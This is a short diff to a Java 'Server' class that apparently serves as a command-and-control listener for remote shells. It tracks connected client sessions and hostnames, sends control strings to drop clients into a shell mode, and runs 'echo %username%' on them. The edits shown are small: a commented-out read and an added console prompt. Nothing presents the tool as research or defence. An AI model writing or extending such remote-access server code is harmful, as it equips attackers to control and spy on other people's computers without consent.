@@ -59,7 +59,7 @@ public class Server implements Runnable {
                     System.out.println("type -99 to exit environemt");
                     try {
                         ps.println("sh99");
-                        din.readLine();
+                        //din.readLine();
                         ps.println("echo %username%");
                         String uname = din.readLine();
                         din.readLine();
@@ -171,7 +171,8 @@ public class Server implements Runnable {
             hostname = hostname.substring(hostname.indexOf(" ")+1);
             hostnames.add(hostname);
             sessions.add(cs);
-            System.out.println("NEW CONNECTION - " + cs.getInetAddress() + " - " + hostname);
+            System.out.println("\nNEW CONNECTION - " + cs.getInetAddress() + " - " + hostname);
+            System.out.print("<console> : ");
             tps.println("sh-99");
         } catch (Exception e) {
             System.out.println("failed to add new socket");
